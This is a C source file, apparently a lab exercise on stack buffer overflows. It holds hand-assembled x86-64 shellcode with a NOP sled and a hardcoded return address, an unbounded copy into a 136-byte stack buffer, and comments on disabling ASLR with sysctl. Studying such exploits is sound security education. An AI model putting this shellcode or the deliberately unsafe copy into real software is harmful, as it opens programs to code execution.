#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}


// VAriable to contain hex bytes of shell code
char compromise[159] = {
    //NOP Size: 45
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90,                                   // NOP padding

    //Initial Exploit Size: 115
    0x48, 0x31, 0xC0,                  //start:      xor rax, rax
    0x50,                                  //push rax
    0x48, 0x31, 0xC0,                              //xor rax, rax
    0x48, 0xB8, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x65, 0x6E,                 //mov rax, '/bin/env'
    0x76,                 
    0x50,                                  //push rax
    0x48, 0x89, 0xE7,                              //mov rdi, rsp
    0x48, 0x31, 0xC0,                              //xor rax, rax
    0x50,                                  //push rax
    0x57,                                  //push rdi
    0x48, 0x89, 0xE6,                              //mov rsi, rsp
    0x48, 0x31, 0xD2,                              //xor rdx, rdx
    0x66, 0xBA, 0xFF, 0x7F,                            //mov dx, 0x7fff
    0x48, 0xC1, 0xE2, 0x20,                            //shl rdx, 32
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,                          //mov ecx, 0xf7fbe6ff
    0x30, 0xC9,                                //xor cl, cl
    0x48, 0x09, 0xCA,                              //or rdx, rcx
    0x48, 0x8B, 0x12,                              //mov rdx, [rdx]
    0x48, 0x31, 0xC0,                              //xor rax, rax
    0xB0, 0x3B,                                //mov al, 0x3B
    0x0F, 0x05,                                //syscall
    0xB0, 0x3C,                                //mov al, 0x3c
    0x48, 0x89, 0xC7,                              //mov rdi, rax
    0x0F, 0x05,                                //syscall
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    //6B000000                //end:        dd end-start
    
    //Return Address Stack Pointer: 0x7fffffffe068 - 0x98 (152 Chars) = 0x7FFFFFFFDFD0
    //Return Adress Size: 7
    0xD0, 0xDF, 0xFF, 0xFF, 0xFF, 0x7F,
    0x00 //Null Byte termination
};

// string variable to probe the stack and find the correct
// values for the shell code.

// Before compiling the makefile and all - ensure the following setup has been completed to retrieve core dump file.
// ulimit -c unlimited
// sysctl kernel.randomize_va_space=0
// sysctl kernel.core_pattern=core

// Bus error (core dumped)
// Segmentation fault (core dumped)
// $1 = (<data variable, no debug info> *) 0x7ffff7fbe600 <environ>

char *compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"
    "MNOPWXYZ"
    "xxxxxxxx";

// 4D 4E 4F 50 57 58 59 5A 5A
// M N O P W X Y Z
// 0x5a595857504f4e4d

//Selfcomp: MD5=8b7588b30498654be2626aac62ef37a3

int i;

void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}

